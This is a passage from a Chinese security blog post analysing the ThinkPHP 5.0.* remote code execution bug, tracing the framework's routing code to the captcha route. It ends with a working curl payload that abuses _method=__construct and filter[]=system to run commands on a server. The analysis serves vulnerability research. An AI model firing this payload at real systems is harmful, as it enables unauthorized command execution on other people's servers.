Response::create();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 监听 app_end</span><br><span class="line">        Hook::listen(&apos;app_end&apos;, $response);</span><br><span class="line"></span><br><span class="line">        return $response;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>// 未设置调度信息则进行 URL 路由检测,调用了<code>$dispatch = self::routeCheck($request, $config);</code></p>
+<p>routeCheck方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">public static function routeCheck($request, array $config)</span><br><span class="line">    &#123;</span><br><span class="line">        //path 可通过s参数获得</span><br><span class="line">        $path   = $request-&gt;path();</span><br><span class="line">        $depr   = $config[&apos;pathinfo_depr&apos;];</span><br><span class="line">        $result = false;</span><br><span class="line"></span><br><span class="line">        // 路由检测</span><br><span class="line">        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config[&apos;url_route_on&apos;];</span><br><span class="line">        if ($check) &#123;</span><br><span class="line">            // 开启路由</span><br><span class="line">            if (is_file(RUNTIME_PATH . &apos;route.php&apos;)) &#123;</span><br><span class="line">                // 读取路由缓存</span><br><span class="line">                $rules = include RUNTIME_PATH . &apos;route.php&apos;;</span><br><span class="line">                is_array($rules) &amp;&amp; Route::rules($rules);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $files = $config[&apos;route_config_file&apos;];</span><br><span class="line">                foreach ($files as $file) &#123;</span><br><span class="line">                    if (is_file(CONF_PATH . $file . CONF_EXT)) &#123;</span><br><span class="line">                        // 导入路由配置</span><br><span class="line">                        $rules = include CONF_PATH . $file . CONF_EXT;</span><br><span class="line">                        is_array($rules) &amp;&amp; Route::import($rules);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 路由检测（根据路由定义返回不同的URL调度）</span><br><span class="line">            $result = Route::check($request, $path, $depr, $config[&apos;url_domain_deploy&apos;]);</span><br><span class="line">            $must   = !is_null(self::$routeMust) ? self::$routeMust : $config[&apos;url_route_must&apos;];</span><br><span class="line"></span><br><span class="line">            if ($must &amp;&amp; false === $result) &#123;</span><br><span class="line">                // 路由无效</span><br><span class="line">                throw new RouteNotFoundException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索</span><br><span class="line">        if (false === $result) &#123;</span><br><span class="line">            $result = Route::parseUrl($path, $depr, $config[&apos;controller_auto_search&apos;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>$result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);</code></p>
+<p>check方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">public static function check($request, $url, $depr = &apos;/&apos;, $checkDomain = false)</span><br><span class="line">    &#123;</span><br><span class="line">       。。。。。。。。。。。。。。。。。。。。。。。。。。。。。</span><br><span class="line">        $method = strtolower($request-&gt;method());</span><br><span class="line">        // 获取当前请求类型的路由规则</span><br><span class="line">        $rules = isset(self::$rules[$method]) ? self::$rules[$method] : [];</span><br><span class="line">        // 检测域名部署</span><br><span class="line">        if ($checkDomain) &#123;</span><br><span class="line">            self::checkDomain($request, $rules, $method);</span><br><span class="line">        &#125;</span><br><span class="line">        // 检测URL绑定</span><br><span class="line">        $return = self::checkUrlBind($url, $rules, $depr);</span><br><span class="line">        if (false !== $return) &#123;</span><br><span class="line">            return $return;</span><br><span class="line">        &#125;</span><br><span class="line">        if (&apos;|&apos; != $url) &#123;</span><br><span class="line">            $url = rtrim($url, &apos;|&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">        $item = str_replace(&apos;|&apos;, &apos;/&apos;, $url);</span><br><span class="line">        if (isset($rules[$item])) &#123;</span><br><span class="line">            // 静态路由规则检测</span><br><span class="line">            $rule = $rules[$item];</span><br><span class="line">            if (true === $rule) &#123;</span><br><span class="line">                $rule = self::getRouteExpress($item);</span><br><span class="line">            &#125;</span><br><span class="line">            if (!empty($rule[&apos;route&apos;]) &amp;&amp; self::checkOption($rule[&apos;option&apos;], $request)) &#123;</span><br><span class="line">                self::setOption($rule[&apos;option&apos;]);</span><br><span class="line">                return self::parseRule($item, $rule[&apos;route&apos;], $url, $rule[&apos;option&apos;]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 路由规则检测</span><br><span class="line">        if (!empty($rules)) &#123;</span><br><span class="line">            return self::checkRoute($request, $rules, $url, $depr);</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>$method = strtolower($request-&gt;method());</code>这里的<code>$method</code>可以通过传递参数<code>method</code>控制。</p>
+<p>最终会进入路由规则检测：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 路由规则检测</span><br><span class="line">        if (!empty($rules)) &#123;</span><br><span class="line">            return self::checkRoute($request, $rules, $url, $depr);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>checkRoute方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">private static function checkRoute($request, $rules, $url, $depr = &apos;/&apos;, $group = &apos;&apos;, $options = [])</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($rules as $key =&gt; $item) &#123;</span><br><span class="line">            if (true === $item) &#123;</span><br><span class="line">                $item = self::getRouteExpress($key);</span><br><span class="line">            &#125;</span><br><span class="line">            if (!isset($item[&apos;rule&apos;])) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            $rule    = $item[&apos;rule&apos;];</span><br><span class="line">            $route   = $item[&apos;route&apos;];</span><br><span class="line">            $vars    = $item[&apos;var&apos;];</span><br><span class="line">            $option  = $item[&apos;option&apos;];</span><br><span class="line">            $pattern = $item[&apos;pattern&apos;];</span><br><span class="line"></span><br><span class="line">            // 检查参数有效性</span><br><span class="line">            if (!self::checkOption($option, $request)) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (isset($option[&apos;ext&apos;])) &#123;</span><br><span class="line">                // 路由ext参数 优先于系统配置的URL伪静态后缀参数</span><br><span class="line">                $url = preg_replace(&apos;/\.&apos; . $request-&gt;ext() . &apos;$/i&apos;, &apos;&apos;, $url);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (is_array($rule)) &#123;</span><br><span class="line">                // 分组路由</span><br><span class="line">                $pos = strpos(str_replace(&apos;&lt;&apos;, &apos;:&apos;, $key), &apos;:&apos;);</span><br><span class="line">                if (false !== $pos) &#123;</span><br><span class="line">                    $str = substr($key, 0, $pos);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    $str = $key;</span><br><span class="line">                &#125;</span><br><span class="line">                if (is_string($str) &amp;&amp; $str &amp;&amp; 0 !== stripos(str_replace(&apos;|&apos;, &apos;/&apos;, $url), $str)) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                self::setOption($option);</span><br><span class="line">                $result = self::checkRoute($request, $rule, $url, $depr, $key, $option);</span><br><span class="line">                if (false !== $result) &#123;</span><br><span class="line">                    return $result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; elseif ($route) &#123;</span><br><span class="line">                if (&apos;__miss__&apos; == $rule || &apos;__auto__&apos; == $rule) &#123;</span><br><span class="line">                    // 指定特殊路由</span><br><span class="line">                    $var    = trim($rule, &apos;__&apos;);</span><br><span class="line">                    $&#123;$var&#125; = $item;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                if ($group) &#123;</span><br><span class="line">                    $rule = $group . ($rule ? &apos;/&apos; . ltrim($rule, &apos;/&apos;) : &apos;&apos;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                self::setOption($option);</span><br><span class="line">                if (isset($options[&apos;bind_model&apos;]) &amp;&amp; isset($option[&apos;bind_model&apos;])) &#123;</span><br><span class="line">                    $option[&apos;bind_model&apos;] = array_merge($options[&apos;bind_model&apos;], $option[&apos;bind_model&apos;]);</span><br><span class="line">                &#125;</span><br><span class="line">                $result = self::checkRule($rule, $route, $url, $pattern, $option, $depr);</span><br><span class="line">                if (false !== $result) &#123;</span><br><span class="line">                    return $result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (isset($auto)) &#123;</span><br><span class="line">            // 自动解析URL地址</span><br><span class="line">            return self::parseUrl($auto[&apos;route&apos;] . &apos;/&apos; . $url, $depr);</span><br><span class="line">        &#125; elseif (isset($miss)) &#123;</span><br><span class="line">            // 未匹配所有路由的路由规则处理</span><br><span class="line">            return self::parseRule(&apos;&apos;, $miss[&apos;route&apos;], $url, $miss[&apos;option&apos;]);</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里有效的route只有完整版中才有的<code>captcha</code>。</p>
+<p><img src="/assets/php/TIM截图20190112215227.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">\think\Route::get(&apos;captcha/[:id]&apos;, &quot;\\think\\captcha\\CaptchaController@index&quot;);</span><br><span class="line"></span><br><span class="line">\think\Validate::extend(&apos;captcha&apos;, function ($value, $id = &quot;&quot;) &#123;</span><br><span class="line">    return captcha_check($value, $id, (array)\think\Config::get(&apos;captcha&apos;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">\think\Validate::setTypeMsg(&apos;captcha&apos;, &apos;验证码错误!&apos;);</span><br></pre></td></tr></table></figure>
+<p>所以，需要传入<code>s=captcha</code> 并且<code>method=get</code>。</p>
+<p>由于<code>返回值$dispatch[&#39;type&#39;]=&#39;method&#39;</code>，最终会调用<code>param</code>方法，就和开启debug模式一样了。</p>
+<p>最终，5.0.*完整版，默认即可，通杀payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -d &quot;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=dir&quot; &quot;http://localhost/loudong/public/index.php?s=captcha&amp;a=dir&quot;</span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/8880/">https://www.tiandiwuji.top/posts/8880/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/8880/">January 12th 2019, 11:49:55 am</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/30918/" title="day-day-up">
+                    <div class="nextTitle">day-day-up</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/41682/" title="设计模式">
+                    <div class="prevTitle">设计模式</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Thinkphp5-0-23核心板为例"><span class="toc-number">1.</span> <span class="toc-text">Thinkphp5.0.23核心板为例:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Thinkphp5-0-22完整板为例"><span class="toc-number">2.</span> <span class="toc-text">Thinkphp5.0.22完整板为例:</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 81
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href="/posts/30918/">day-day-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/12</span><a class="archive-post-title" href="/posts/8880/">Thinkphp5.0.*之RCE漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href="/posts/41682/">设计模式</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href="/posts/53933/">剑指ofer</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span><a class="archive-post-title" href="/posts/56986/">35c3ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span><a class="archive-post-title" href="/posts/7845/">java开发小记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/21</span><a class="archive-post-title" href="/posts/24928/">软件安装相关问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/posts/33972/">otter-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/posts/21890/">内存取证分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href="/posts/49664/">xmasctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href="/posts/11772/">hxp-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/31116/">ctf题目-php调试分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/36891/">php7.2内核调试环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href="/posts/46756/">linux-优化实战笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/posts/41159/">RealWorldFinal</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href="/posts/4968/">pwnable.tw练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href="/posts/48844/">bctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/59263/">安全设备名词解释</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/23961/">安全域划分的相关问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href="/posts/16617/">code-breaking</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/posts/3376/">lctf-2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href="/posts/62306/">babystack-ret2dlsolve</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
